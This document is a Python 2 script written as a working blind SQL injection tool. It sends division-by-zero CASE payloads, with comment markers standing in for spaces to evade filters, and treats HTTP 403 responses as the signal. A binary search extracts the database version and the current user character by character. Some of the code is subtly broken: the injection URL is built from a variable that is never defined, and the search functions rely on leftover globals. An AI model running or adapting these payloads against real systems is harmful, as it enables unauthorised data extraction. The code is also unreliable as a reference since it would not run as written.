import requests
import argparse
import string
import sys


proxy = {'http':'127.0.0.1:8080'}

def is_true(r):
    return r.status_code == 403 


def find_strlen(lo,hi,url,payload):
    guess = (lo + hi) / 2
    p = payload.replace('[CHAR]',str(guess))
    p = p.replace('[COMP]',"=")
    u = url + p
    r = requests.get(u,proxies=proxy)
    if is_true(r):
        return guess
    else:
        p = payload.replace('[CHAR]',str(guess))
        p = p.replace('[COMP]',">")
        u = url + p
        r = requests.get(u)
        if(is_true(r)):
            return find_strlen(guess,hi,url,payload)
        else:
            return find_strlen(lo,guess,url,payload)




def guess_string(url,payload,character_list):
   def gess_char(lo,hi,pos,payload):
       index = (lo + hi) /2
       guess = character_list[index]
       p = payload.replace('[CHAR]',str(ord(guess)))
       p = p.replace('[COMP]',"=")
       p = p.replace('[POS]',str(pos))
       u = url + p
       r = requests.get(u)
       if is_true(r):
           return guess
       else:
           p = payload.replace('[CHAR]',str(ord(guess)))
           p = p.replace('[COMP]',">")
           p = p.replace('[POS]',str(pos))
           u = url + p
           r = requests.get(u)
           if is_true(r):
               return gess_char(index,hi,pos,payload)
           else:
               return gess_char(lo,index,pos,payload)
    
   result = ''
   hi = len(character_list)
   while len(result) < length:
       sys.stdout.flush()
       guess = gess_char(0,hi,len(result)+1,payload)
       sys.stdout.write(guess)
       result += guess
   return result



if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('target',type=str,help='Target url')
    parser.add_argument('-p','--parameter',type=str,help='Vulnerable parameter')
    args = parser.parse_args()


    sqli_url = "%s?%s" % (args.target, user)

    character_list = ''.join(sorted(string.digits+string.ascii_letters+"/$@-.+()_, "))
    payload = "1/(select/**/case/**/when/**/(select/**/cast(length(version())/**/as/**/integer))[COMP][CHAR]/**/then/**/0/**/else/**/1/**/end)--" 
    length = find_strlen(0,150,sqli_url,payload)
    payload = "1/(select/**/case/**/when/**/(select/**/cast(ascii(substring(version(),[POS],1))/**/as/**/integer))[COMP][CHAR]/**/then/**/0/**/else/**/1/**/end)--" 
    print "[+] Database Version: ",
    version = guess_string(sqli_url,payload,character_list)
    payload = "1/(select/**/case/**/when/**/(select/**/cast(length((select/**/current_user))/**/as/**/integer))[COMP][CHAR]/**/then/**/0/**/else/**/1/**/end)--" 
    length = find_strlen(0,150,sqli_url,payload)
    print length
    payload = "1/(select/**/case/**/when/**/(select/**/cast(ascii(substring((select/**/current_user),[POS],1))/**/as/**/integer))[COMP][CHAR]/**/then/**/0/**/else/**/1/**/end)--" 
    print "\n[+] Database User: ",
    user = guess_string(sqli_url,payload,character_list)
    print "[*] Done!"
